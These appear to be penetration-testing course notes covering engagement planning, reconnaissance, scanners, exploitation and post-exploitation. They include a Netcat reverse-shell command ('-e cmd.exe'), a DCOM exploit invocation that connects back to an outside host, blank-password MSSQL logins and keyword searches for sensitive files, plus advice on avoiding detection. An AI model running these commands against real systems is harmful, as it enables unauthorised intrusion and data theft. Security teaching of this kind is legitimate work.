-------------------------------------
		Day 1
-------------------------------------
Pre-Planning: 
	- Operation Order
	- TA/TCG Letter
	- Non-Disclosure Agreement
	- Rules of Engagement
Open Source Reconnaissance 
	- Information Gathering
	- Data Correlation
Active Reconnaissance 
	- Domain Name Server
	- Internet Protocol
	- TCP/UDP Port Scanning
	- Vulnerability Discovery
Attack Planning
	- External Attack Development
	- Internal Attack Development
Attack Execution
	- External Attack Execution
	- Internal Attack Execution
Reporting


-------------------------------------
		Day 2 
-------------------------------------
nmap scanning: use -oA to output all formats, list a directory and file name with it
Vulnerabilities:
	- Programming Related
		1. Connections
		2. Exploit Code
	- Misconfiguration
		1. Connections
		2. Username
		3. Password


Two ways to exploit a vulnerability:
	- Remotely: A vulnerability that can be exploited via the network
	- Locally: A vulnerability that can only be exploited from within the system (i.e. while logged in)

Consider during a vulnerability scan after you make it into the network to see things that you may not see from the outside

Three categories of automated vulnerability discovery scanners:
	- Attack Frameworks
		1. Core Impact
		2. Immunity Canvas
		3. Metasploit
	- System Scanners
		1. eEye Retina
		2. Nessus
		3. OpenVAS
	- Application-Specific
		1. Web Server Scanners
			- Nikto
---------------------------------------------------------------------------------- 
perl nikto.pl [options]
  Options:
       -Cgidirs Scan these CGI dirs: 'none', 'all', or a value like '/cgi/'
       -cookies print cookies found
      -debug debug mode
       -findonly find http(s) ports only, don't perform a full scan
      -Format save file (-o) Format: htm, csv or txt (assumed)
       -generic force full (generic) scan
       -host + target host
       -id + host authentication to use, format is userid:password
       -nolookup skip name lookup
       -output + write output to this file
       -port + port to use (default 80)
       -root + prepend root value to all requests, format is /directory
       -ssl force ssl mode on port
       -timeout timeout (default 10 seconds)
       -useproxy use the proxy defined in config.txt
       -verbose verbose mode
       -vhost + virtual host (for Host header)
  Example: perl nikto.pl -host 192.168.0.5 –nolookup  -output niktoscan.txt               
                                 + requires a value
----------------------------------------------------------------------------------
			- Whisker
		2. Web Application Scanners
			- WPScan
			- Acunetix
			- SQLMap
		3. Web Extension Scanners
			- WebDavin






Exploitation
-------------
An exploit is any action or method that takes advantage of a vulnerability
	- can be destructive
	- effects can very
	- not always reliable
	- caution must be exercised
Considerations: 
	- Is the exploit trusted?
	- What does the exploit do?
	- What does the shell code do?
	- What will happen to the service?
Remote vs client-side Exploits
Typical usage scenarios = Initial attack vector, DoS attack

Goals
	- RCE (Remote Code Execution)
	- Denial of Service
Targets
	- Infrastructure Devices
		- Routers
		- Firewalls
		- IDS/IPS
	- Public facing & internal servers
	- End user workstations
- Target publicily accessible systems and pivot further into the network

Web Exploitation 
	- SQL Injection: SQL commands are passed through a web site's input field and executed due to a failure to filter and sanitize strings
	- Directory Traversal: "back out" of a sandboxed directory and access file system, commonly executed with "../"
	- Parameter Tampering: manipulation of URL or HTML source code to change functionality of a web application

Remote Exploitation 
	- Remote Code Execution: ability to trigger arbitrary code execution from one machine to another
	- Denial of Service: causes system to crash or become unusable
Where to get exploits
	- Attack Frameworks
		- CANVAS
		- IMPACT
		- Metasploit
	- Code them yourself
	- Internet (needs to be analyzed for malicious code)
		- SecurityFocus
		- PacketStorm
		- Exploit DB

External Attack 
	- Vulnerability Research
	- Attack Automation
		- Lab Building: Mock of target network that can and will be attacked repeatedly to iron out potential problems that may occur on the target
		- Click Scripts: Files that contain a logged set of commands to copy and paste to a host. Use some form of note taking application that strips formatting. Allows replication of attack, decreases chance of detection and helps track the commands already executed and eliminates time wasted researching syntax.

---------------------------------------------------------------------------
Click Script Guidelines
1. Script every command, however simple.
2. Copy and Paste onto target; never type command directly onto target.
3. Never delete lines; create a new line for every unique command.
4. Organize commands into groups and include notes/comments.
5. Arrange commands chronologically
---------------------------------------------------------------------------

Internal Attack Planning
- Is difficuult because the internal network is shielded by many layers of security.
- some assumptions must be made..
	- What information do we know?
	- Windows or Unix network?
	- What is the basic topology?
- Click scripts are made for the type of network in place; usually focus on many different commands to collect reconnaissance
- Assumptions need to be validated
- Run attack procedures in a lab environment and modify scripts as needed
- Quiet access + maintain access + patience

------------------------------------------------------------------
NetCat Syntax
Connect to somewhere:   nc [-options] hostname port[s] [ports]
Listen for inbound:     nc -l -p port [options] 
To Connect: nc [IP ADDRESS OF LISTENER] [PORT OF LISTENER] –e cmd.exe
	Options:
-d : detach from console, stealth mode
-e : prog inbound program to exec
-i secs : delay interval for lines sent, ports scanned
-l : listen mode, for inbound connections
-L : listen harder, re-listen on socket close
-n : numeric-only IP addressess, no DNS
-p port : local port number
-r : randomize local and remote ports
-t : answer TELNET negotiation
-v : verbose [use twice to be more verbose]
-w sec : timeout for connects and final net reads
-z : zero-I/O mode [used for scanning]
 	Example: 
 To Listen: nc -lvp 443
 To Connect: nc 192.168.10.3 1234 –e cmd.exe
------------------------------------------------------------------

------------------------------------------------------------------
DCOM Syntax
d -d <host> [options]

Options:
-d Hostname to attack [required]
-t Type [Default: 0]
-r Return address [Default: Selected from target]
-p Attack port [Default: 135]
-l Bindshell port [Default: 666]
-h the IP address to connect back to
-P the port connect back to

Types:
0 [Win2k-Universal]
1 [WindXP-Universal]
Example: d -d 127.0.0.1 -h 204.139.95.100 -P 2222
------------------------------------------------------------------

Summary: 
	- Attack plans consist of turning the vulnerabilities of a target into a plan of action for compromise

Intro to Post Exploitation
- Sensitive Information is often stored in easily located folders like, User desktops, "My Documents" folder, and User-created directories
Attrib and Findstr Syntax
	- Attrib /D /S c:\*keyword*.* (Find any filename or folder name with keyword.)
	- Findstr /P /I /S "keyword" C:\*.* (Find any files that contain the keyword.)
Recon of Active Connections:
	- Net use: mapped network shared
	- Netstat -an: active network connections
	- ARP table entries: arp -a
	- Routing table entries: route PRINT
	- Network interface settings: ipconfig /all
OSQL Syntax:
	Options:
		-U login id
		-P password
		-S server
		-H hostname
		-E trusted connection
		-d use database name
		-l login timeout
		-t query timeout 
		-L list servers
		-q "cmdline query"
		-Q "cmdline query" and exit
		-i inputfile
		-o outputfile
Example: osql -U sa -P "" -S 192.168.0.5 -Q "select @@version"

